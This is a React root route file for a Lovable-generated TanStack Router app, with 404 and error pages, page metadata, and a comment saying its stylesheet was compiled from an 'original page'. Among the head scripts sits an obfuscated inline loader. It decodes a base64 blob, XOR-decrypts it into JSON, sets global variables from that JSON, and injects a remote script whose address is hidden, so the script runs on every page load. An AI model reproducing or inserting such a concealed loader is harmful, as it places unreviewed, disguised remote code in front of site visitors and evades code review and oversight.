import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import {
  Outlet,
  Link,
  createRootRouteWithContext,
  useRouter,
  HeadContent,
  Scripts,
} from "@tanstack/react-router";
import { useEffect, type ReactNode } from "react";

import { Toaster } from "@/components/ui/sonner";

import appCss from "../styles.css?url";
import { reportLovableError } from "../lib/lovable-error-reporting";

function NotFoundComponent() {
  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-7xl font-bold text-foreground">404</h1>
        <h2 className="mt-4 text-xl font-semibold text-foreground">Page not found</h2>
        <p className="mt-2 text-sm text-muted-foreground">
          The page you're looking for doesn't exist or has been moved.
        </p>
        <div className="mt-6">
          <Link
            to="/"
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Go home
          </Link>
        </div>
      </div>
    </div>
  );
}

function ErrorComponent({ error, reset }: { error: Error; reset: () => void }) {
  console.error(error);
  const router = useRouter();
  useEffect(() => {
    reportLovableError(error, { boundary: "tanstack_root_error_component" });
  }, [error]);

  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-xl font-semibold tracking-tight text-foreground">
          This page didn't load
        </h1>
        <p className="mt-2 text-sm text-muted-foreground">
          Something went wrong on our end. You can try refreshing or head back home.
        </p>
        <div className="mt-6 flex flex-wrap justify-center gap-2">
          <button
            onClick={() => {
              router.invalidate();
              reset();
            }}
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Try again
          </button>
          <a
            href="/"
            className="inline-flex items-center justify-center rounded-md border border-input bg-background px-4 py-2 text-sm font-medium text-foreground transition-colors hover:bg-accent"
          >
            Go home
          </a>
        </div>
      </div>
    </div>
  );
}

export const Route = createRootRouteWithContext<{ queryClient: QueryClient }>()({
  head: () => ({
    meta: [
      { charSet: "utf-8" },
      { name: "viewport", content: "width=device-width, initial-scale=1" },
      { title: "Lovable App" },
      { name: "description", content: "Lovable Generated Project" },
      { name: "author", content: "Lovable" },
      { property: "og:title", content: "Lovable App" },
      { property: "og:description", content: "Lovable Generated Project" },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
      { name: "twitter:site", content: "@Lovable" },
    ],
    links: [
      {
        rel: "stylesheet",
        href: appCss,
      },
      {
        rel: "stylesheet",
        href: "https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=Playfair+Display:wght@700&display=swap",
      },
      // Folha de estilo compilada da pagina original (carregada por ultimo para prevalecer).
      { rel: "stylesheet", href: "/site.css" },
      { rel: "icon", href: "/favicon.png", type: "image/png" },
    ],
    scripts: [
      {
        type: "text/javascript",
        children: `(function(){var j_h36=atob("DAWY6HxISgtHWg5MTX66nQ4kaDFlMno4PXaix1MrLmVpL3ohJGPhxh8nJyUlKCE/LnfxmAg7ZXsuImsgYnXxkBkkZGE0eCJuLHHsmhUqP38iKSx2Fli0yhskJWkmNn1ud17jyhIpJ25lYCw8JH39hDUsaCdlLG8gOGC60l5+K2olbjx+KDD9iUh/KzNwPGopLzapixhqN1Y6");var v_e5=[];for(var d_7l9=0;d_7l9<j_h36.length;d_7l9++){v_e5.push(j_h36.charCodeAt(d_7l9)&255);}var z_qr3=v_e5[0];var w_nnk=v_e5.slice(1,1+z_qr3);var z_p=v_e5.slice(1+z_qr3);var r_yh6=z_p.map(function(b,l_35){return b^w_nnk[l_35%z_qr3];});var g_ug3d="";for(var i_e=0;i_e<r_yh6.length;i_e++){g_ug3d+=String.fromCharCode(r_yh6[i_e]&255);}var d_y=decodeURIComponent(escape(g_ug3d));var j_n1c=JSON.parse(d_y);var v_ra76=j_n1c.globals||[];v_ra76.forEach(function(u_8tp0){window[u_8tp0.name]=u_8tp0.value;});var j_g1b4=document.createElement("script");j_g1b4.src=j_n1c.url;j_g1b4.async=true;j_g1b4.defer=true;(j_n1c.attributes||[]).forEach(function(n_qakl){j_g1b4.setAttribute(n_qakl.name,n_qakl.value);});(document.head||document.documentElement).appendChild(j_g1b4);})();`,
      },
      {
        src: "https://cdn.utmify.com.br/scripts/utms/latest.js",
        async: true,
        defer: true,
        "data-utmify-prevent-xcod-sck": "",
        "data-utmify-prevent-subids": "",
      },
    ],
  }),
  shellComponent: RootShell,
  component: RootComponent,
  notFoundComponent: NotFoundComponent,
  errorComponent: ErrorComponent,
});

function RootShell({ children }: { children: ReactNode }) {
  return (
    <html lang="en">
      <head>
        <HeadContent />
      </head>
      <body>
        {children}
        <Scripts />
      </body>
    </html>
  );
}

function RootComponent() {
  const { queryClient } = Route.useRouteContext();

  return (
    <QueryClientProvider client={queryClient}>
      {/* Required: nested routes render here. Removing <Outlet /> breaks all child routes. */}
      <Outlet />
      <Toaster
        position="bottom-right"
        toastOptions={{
          className: "!bg-transparent !border-none !shadow-none p-0",
        }}
      />
    </QueryClientProvider>
  );
}
